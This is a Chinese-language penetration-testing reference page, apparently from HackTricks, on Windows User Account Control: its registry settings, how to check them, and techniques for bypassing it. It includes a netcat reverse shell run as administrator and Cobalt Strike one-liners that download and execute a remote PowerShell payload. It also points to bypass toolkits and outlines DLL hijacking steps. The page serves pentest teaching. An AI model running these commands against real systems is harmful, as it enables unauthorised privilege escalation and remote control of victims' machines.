# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[用户帐户控制 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一个功能，允许**提升活动的同意提示**。应用程序具有不同的 `integrity` 级别，具有**高级别**的程序可以执行**可能危害系统**的任务。当 UAC 启用时，应用程序和任务始终**在非管理员帐户的安全上下文中运行**，除非管理员明确授权这些应用程序/任务以管理员级别访问系统进行运行。这是一个便利功能，可以保护管理员免受意外更改，但不被视为安全边界。

有关完整性级别的更多信息：

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当 UAC 生效时，管理员用户会获得 2 个令牌：一个标准用户密钥，用于以常规级别执行常规操作，以及一个具有管理员权限的密钥。

此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 深入讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的工作方式，或通过组策略对象 (GPO) 在 Active Directory 域环境中配置并推送。各种设置在 [这里](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) 详细讨论。可以为 UAC 设置 10 个组策略设置。以下表格提供了更多详细信息：

| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表键                | 默认设置                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [用户帐户控制：内置管理员帐户的管理员批准模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 禁用                                                     |
| [用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 禁用                                                     |
| [用户帐户控制：管理员在管理员批准模式下的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 对非 Windows 二进制文件提示同意                  |
| [用户帐户控制：标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 在安全桌面上提示凭据                 |
| [用户帐户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 启用（家庭版默认）禁用（企业版默认） |
| [用户帐户控制：仅提升已签名和验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 禁用                                                     |
| [用户帐户控制：仅提升安装在安全位置的 UIAccess 应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 启用                                                      |
| [用户帐户控制：在管理员批准模式下运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 启用                                                      |
| [用户帐户控制：在提示提升时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 启用                                                      |
| [用户帐户控制：将文件和注册表写入失败虚拟化到每用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 启用                                                      |

### UAC 绕过理论

一些程序会在**用户属于** **管理员组**时**自动提升**。这些二进制文件在其 _**Manifests**_ 中具有 _**autoElevate**_ 选项，值为 _**True**_。该二进制文件还必须**由 Microsoft 签名**。

然后，为了**绕过** **UAC**（从**中等**完整性级别**提升到高**），一些攻击者使用这种二进制文件来**执行任意代码**，因为它将从**高完整性级别进程**中执行。

您可以使用 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制文件的 _**Manifest**_。您可以使用 _Process Explorer_ 或 _Process Monitor_（来自 Sysinternals）查看进程的**完整性级别**。

### 检查 UAC

要确认 UAC 是否启用，请执行：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果是 **`1`**，则 UAC **已激活**；如果是 **`0`** 或 **不存在**，则 UAC **未激活**。

然后，检查 **配置的级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- 如果 **`0`**，则 UAC 不会提示（如 **禁用**）
- 如果 **`1`**，管理员会被 **要求输入用户名和密码** 以高权限执行二进制文件（在安全桌面上）
- 如果 **`2`**（**始终通知我**），UAC 将始终在管理员尝试以高权限执行某些操作时要求确认（在安全桌面上）
- 如果 **`3`**，类似于 `1`，但不一定在安全桌面上
- 如果 **`4`**，类似于 `2`，但不一定在安全桌面上
- 如果 **`5`**（**默认**），它会要求管理员确认以高权限运行非 Windows 二进制文件

然后，您需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果值为 **`0`**，则只有 **RID 500** 用户（**内置管理员**）能够在没有 UAC 的情况下执行 **管理员任务**，如果为 `1`，则 **“Administrators”** 组中的所有帐户都可以执行这些任务。

最后，查看 **`FilterAdministratorToken`** 键的值\
如果 **`0`**（默认），则 **内置管理员帐户可以** 执行远程管理任务；如果 **`1`**，则内置管理员帐户 **无法** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 设置为 `1`。

#### 总结

- 如果 `EnableLUA=0` 或 **不存在**，**对任何人都没有 UAC**
- 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=1`，对任何人都没有 UAC**
- 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=0`，对 RID 500（内置管理员）没有 UAC**
- 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=1`，对所有人都有 UAC**

所有这些信息可以使用 **metasploit** 模块收集：`post/windows/gather/win_privs`

您还可以检查用户的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC 绕过

> [!NOTE]
> 请注意，如果您可以图形访问受害者，UAC 绕过是直接的，因为您可以在 UAS 提示出现时简单地点击“是”

在以下情况下需要 UAC 绕过：**UAC 已激活，您的进程在中等完整性上下文中运行，并且您的用户属于管理员组**。

重要的是要提到，如果 UAC 处于最高安全级别（始终），则**绕过 UAC 要比在其他任何级别（默认）下要困难得多**。

### UAC 禁用

如果 UAC 已经禁用（`ConsentPromptBehaviorAdmin` 为 **`0`**），您可以使用类似的方式**以管理员权限执行反向 shell**（高完整性级别）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC 绕过与令牌复制

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常** 基本的 UAC "绕过"（完全文件系统访问）

如果你有一个属于管理员组的用户的 shell，你可以 **通过 SMB 挂载 C$** 共享到一个新的磁盘上，这样你将 **访问文件系统中的所有内容**（甚至是管理员的主文件夹）。

> [!WARNING]
> **看起来这个技巧不再有效**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC 绕过与 Cobalt Strike

Cobalt Strike 技术仅在 UAC 未设置为最高安全级别时有效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有几个模块可以 **绕过** **UAC**。

### KRBUACBypass

文档和工具在 [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC 绕过漏洞

[**UACME** ](https://github.com/hfiref0x/UACME) 是几个 UAC 绕过漏洞的 **汇编**。请注意，您需要 **使用 Visual Studio 或 msbuild 编译 UACME**。编译将创建几个可执行文件（如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），您需要知道 **您需要哪个**。\
您应该 **小心**，因为某些绕过会 **提示其他程序**，这会 **警告** **用户** 有事情发生。

UACME 有 **每个技术开始工作的构建版本**。您可以搜索影响您版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
也可以使用[这个](https://en.wikipedia.org/wiki/Windows_10_version_history)页面从构建版本中获取Windows版本`1607`。

#### 更多UAC绕过

**所有**用于绕过AUC的技术**需要**与受害者建立**完全交互的shell**（普通的nc.exe shell不够）。

您可以使用**meterpreter**会话获取。迁移到**Session**值等于**1**的**进程**：

![](<../../images/image (96).png>)

（_explorer.exe_ 应该可以工作）

### 带GUI的UAC绕过

如果您可以访问**GUI，您只需在出现UAC提示时接受它**，您实际上不需要绕过它。因此，获取对GUI的访问将允许您绕过UAC。

此外，如果您获得了某人正在使用的GUI会话（可能通过RDP），则有**一些工具将以管理员身份运行**，您可以**直接以管理员身份运行**例如**cmd**，而无需再次被UAC提示，如[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更加**隐蔽**。

### 嘈杂的暴力破解UAC绕过

如果您不在乎嘈杂，您可以始终**运行类似**[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)的工具，该工具**请求提升权限，直到用户接受它**。

### 您自己的绕过 - 基本UAC绕过方法

如果您查看**UACME**，您会注意到**大多数UAC绕过利用了Dll劫持漏洞**（主要是在_C:\Windows\System32_中写入恶意dll）。[阅读此内容以了解如何找到Dll劫持漏洞](../windows-local-privilege-escalation/dll-hijacking.md)。

1. 找到一个将**自动提升**的二进制文件（检查它执行时是否以高完整性级别运行）。
2. 使用procmon查找可能受到**DLL劫持**影响的“**NAME NOT FOUND**”事件。
3. 您可能需要在某些**受保护路径**（如C:\Windows\System32）中**写入**DLL，而您没有写入权限。您可以使用以下方法绕过此限制：
   1. **wusa.exe**：Windows 7、8和8.1。它允许在受保护路径中提取CAB文件的内容（因为此工具是以高完整性级别执行的）。
   2. **IFileOperation**：Windows 10。
4. 准备一个**脚本**，将您的DLL复制到受保护路径中并执行易受攻击的自动提升二进制文件。

### 另一种UAC绕过技术

该技术是观察一个**自动提升的二进制文件**是否尝试从**注册表**中**读取**要**执行**的**二进制文件**或**命令**的**名称/路径**（如果该二进制文件在**HKCU**中搜索此信息，则更有趣）。

{{#include ../../banners/hacktricks-training.md}}
